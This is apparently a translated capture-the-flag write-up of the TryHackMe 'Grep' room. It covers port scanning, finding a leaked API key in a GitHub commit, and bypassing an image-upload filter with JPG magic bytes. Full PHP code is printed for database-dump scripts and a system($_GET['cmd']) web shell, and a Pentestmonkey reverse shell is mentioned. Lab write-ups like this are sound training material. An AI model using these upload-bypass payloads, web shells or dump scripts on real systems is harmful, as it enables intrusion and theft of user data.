> *This translation has been made by Claude, check out the original writeup [here](README.md).*

# Grep

https://tryhackme.com/room/greprtp

![Screenshot](img/Pasted%20image%2020260328134808.png)

![Screenshot](img/Pasted%20image%2020260328134826.png)
## Initial Recon

![Screenshot](img/Pasted%20image%2020260329113354.png)
### Nmap
Ran `nmap -sS -sV -v $IP` and got the following output:

![Screenshot](img/Pasted%20image%2020260328135704.png)

Ports 22, 80 and 443 open.

Port 80 only has the Apache2 Default Page

![Screenshot](img/Pasted%20image%2020260328135817.png)

Port 443 (https) gave a 403 Forbidden

![Screenshot](img/Pasted%20image%2020260328135935.png)

### Feroxbuster
Ran `feroxbuster -w wordlists/common.txt -u http://$IP` and got the following:

![Screenshot](img/Pasted%20image%2020260328140216.png)

Unfortunately the hits don't lead anywhere.

### Ferox again
Ran the same command but against `https`, got some interesting cgi hits

![Screenshot](img/Pasted%20image%2020260328141903.png)

But I also get 403 Forbidden if I try to visit them.
## OSINT
Googled the name SuperSecure Corp, since the company is called that in the task, and see what hits we get - checked Github first.

Didn't find a hit on the exact name, but found the following:

![Screenshot](img/Pasted%20image%2020260328142300.png)

Could this belong to the CTF? Nope.
### A missed detail
Tobzon got there before me and Onind00, and had managed to access the site. Onind had run Nikto, but missed a detail - a revealing url.

![Screenshot](img/Pasted%20image%2020260328144430.png)

That URL hadn't shown up when he ran it against port 80, but it showed up in a run against port 443. When I put it in `/etc/hosts` I could visit the https version of the website, great!

![Screenshot](img/Pasted%20image%2020260328144718.png)

### New Feroxbuster
Now against the right url and https.

![Screenshot](img/Pasted%20image%2020260328145010.png)

Still quite a few interesting things.
### Trying to register
Tried to register an account, but got:

![Screenshot](img/Pasted%20image%2020260328145551.png)

Invalid or Expired API key. And that's exactly the API key we need to be able to answer the first question.
### OSINT again

Tobzon had a smart idea - checked the SSL cert details.

![Screenshot](img/Pasted%20image%2020260328145759.png)

By searching for the organization's name on GitHub, i.e. `SearchME`, and then sorting by PHP, this repo came up as the first hit.

![Screenshot](img/Pasted%20image%2020260328150006.png)

Found a commit with a telling name

![Screenshot](img/Pasted%20image%2020260328150548.png)

And that commit contained the API key that was the answer to the first question, great!
## Using the key

![Screenshot](img/Pasted%20image%2020260329113448.png)

Now that we had a valid API key it was just a matter of sending it along when I registered a new account. I did this by repeating my registration as before, but with the network tab open in Firefox.

I right-clicked the request that didn't go through, due to an invalid API key, and chose *Edit and resend*. I could then edit the value of the `X-Thm-Api-Key` header with the API key from the commit and click send.

![Screenshot](img/Pasted%20image%2020260328151722.png)

After that I could log in and find the answer to the next question!

<details>
  <summary><b>Click here to see the flag</b></summary>

  ![Screenshot](img/Pasted%20image%2020260328152019.png)
</details>

## Admin email

![Screenshot](img/Pasted%20image%2020260329113515.png)

Next up is finding the admin's email address.

Based on the info we found in the repo we understood that there was an upload function. The upload function seemed to only accept image files, but the validation was only done by checking the file's *magic bytes.* Can we craft a payload with php, with magic bytes for a jpg, and upload it? And does the server allow our payload to execute?

Onind00 fixed a script that wrote out our php snippets while also editing the magic bytes. To test it, we made a script that would run `phpinfo()`, and sure enough it worked.

In the php-info we could find an email address for Server Administrator, `webmaster@grep.thm`, but that wasn't the answer we were looking for.

However, Onind00 managed to put together a php script that dumped the database:

```php
printf '\xFF\xD8\xFF\xE0' > dump.php
cat >> dump.php <<'PHP'
<?php 
echo "<pre>"; 
require_once "../config.php"; 

$res = $mysqli->query("SELECT username, email, name FROM users"); 

if (!$res) { 
	die("SQL error: " . $mysqli->error); 
} 

while ($row = $res->fetch_assoc()) { 
	echo "username: " . $row['username'] . " | email: " . $row['email'] . " | name: " . $row['name'] . "\n"; 
} 
echo "</pre>"; 
?>
PHP
```

The whole command above was run in the terminal to create a php file that starts with the magic bytes for JPG.

The script dumped the following:

<details>
  <summary><b>Click here to look</b></summary>

  ![Screenshot](img/Pasted%20image%2020260328164554.png)
</details>

Which contained the answer to question three. Three down, two to go!

## Name of the web service

![Screenshot](img/Pasted%20image%2020260329113540.png)

After poking around the site a bit without feeling like I was getting closer to a solution, I started looking at the last question instead - figuring out the admin's password.
## The Admin's Password

![Screenshot](img/Pasted%20image%2020260329113554.png)

Since I had managed to dump the usernames, it should be possible to dump the passwords too. Roughly the same script as when we found the admin's email address, but now using `SELECT *` instead.

```php
<?php
$conn = new mysqli("localhost", "root", "password", "postman"); 

echo "<pre>"; 

$result = $conn->query("SELECT * FROM users"); 

while($row = $result->fetch_assoc()) { 
	print_r($row); 
	echo "\n"; 
} 

echo "</pre>"; 
?>
```

That also dumped the passwords, although in encrypted form.

![Screenshot](img/Pasted%20image%2020260328165536.png)

Time to kick off John the Ripper.

Seemed hopeless... Even Hashcat is taking forever so I don't think that's the right way to go.
## Back to the web service...

Checked if there were more databases, which there were. Maybe there would be traces of a name for the web service there?

![Screenshot](img/Pasted%20image%2020260328174701.png)

The tryhackme database is undeniably interesting. Updated the script to

```php
<?php
$conn = new mysqli("localhost", "root", "password", "postman");
echo "<pre>";
$result = $conn->query("
    SELECT TABLE_SCHEMA, TABLE_NAME 
    FROM INFORMATION_SCHEMA.TABLES 
    WHERE TABLE_SCHEMA IN ('phpmyadmin', 'tryhackme')
    ORDER BY TABLE_SCHEMA, TABLE_NAME
");
while($row = $result->fetch_assoc()) {
    print_r($row);
    echo "\n";
}
echo "</pre>";
?>
```

That script only gave me a bunch of tables belonging to phpmyadmin though, and none stood out from what's standard.

After getting tired of creating a script and uploading it for every table I wanted to look at, I figured there had to be an easier way to poke around on the server. Managed to get a web shell and upload it to the uploads folder.

```php
printf '\xFF\xD8\xFF\xE0' > shell.php
cat >> shell.php <<'PHP'
<?php
$webshell = '<?php system($_GET["cmd"]); ?>';
$result = file_put_contents('/var/www/html/api/uploads/shell.php', $webshell);

if($result) {
    echo "Webshell written successfully!";
} else {
    echo "Error writing file!";
}
?>
PHP
```

Now let's see if I can find some info...

`https://grep.thm/api/uploads/shell.php?cmd=whoami` returns `www-data` at least

I backed up a few steps to check what was outside the uploads folder and found this:

![Screenshot](img/Pasted%20image%2020260328191648.png)

The `leakchecker` folder sounds promising since I'm looking for the name of the web app that handles exactly that kind of service.

Inside the folder I find `check_email.php` and `index.php`.

Tried running `cat` on the files but nothing shows in the browser. And navigating with a web shell is really slow... Time to set up a reverse shell instead.

Made it easy via revshells.com and took PHP Pentestmonkey which I'd used before, uploaded the script and poof, I had my shell.

Navigated to `/var/www/`, and there I found my interesting files again

![Screenshot](img/Pasted%20image%2020260328193024.png)

And this time with `cat`

![Screenshot](img/Pasted%20image%2020260328193138.png)

I'm starting to go a bit crazy :D

But in `/etc/hosts` I found the right name

<details>
  <summary><b>Click here to take a look</b></summary>

  ![Screenshot](img/Pasted%20image%2020260328193706.png)
</details>

Finally a win!

## Almost there now

I'll add the subdomain to my own hosts file and see if I can access the service.

I couldn't, got 403 Forbidden on that too...

Tried a couple of variants with curl, but all got 403 Forbidden.

I'll try to skip accessing the web app entirely. The CTF challenge is called Grep after all, so I'll try to see if I can find some database with old queries on the filesystem. Maybe someone has searched for the admin's email address and gotten a plaintext response back that's saved somewhere.

Searched for all sorts of things on the server. Files ending in `.db`, files containing `backup`, `leakchecker` and more, and more... No useful result unfortunately.

## A bird whispered...

I don't know where the bird came from, but it said *scan all ports...*

What the heck... Okay, nmap again then, with `-p-`. Then I found a magic port: `51337`.

Could this be the endpoint for the famous mail checker?

Tried `https://leakchecker.grep.thm:51337` and sure enough I got in...

![Screenshot](img/Pasted%20image%2020260328202300.png)

Put in the admin's email address there and...

<details>
  <summary><b>Click here to see the last flag</b></summary>

  ![Screenshot](img/Pasted%20image%2020260328202409.png)
</details>

Wow...

## The bird

It was Tobzon, who I had worked with earlier during the day. He and Onind00 had continued while I was busy with other things. During a discussion, Onind had mentioned that he and I had found 3 ports earlier, but Tobzon had found 4...

If I had known about the fourth port, it would have been a walk in the park - I could have skipped dumping databases, trying to crack passwords and popping web and rev shells. But oh well :D

What have I learned from this? Always, *always*, **ALWAYS**, scan all ports with `-p-` on the first scan :D Then you can go deeper, do more thorough scans. But first, just run a scan across the whole range. Don't forget that.
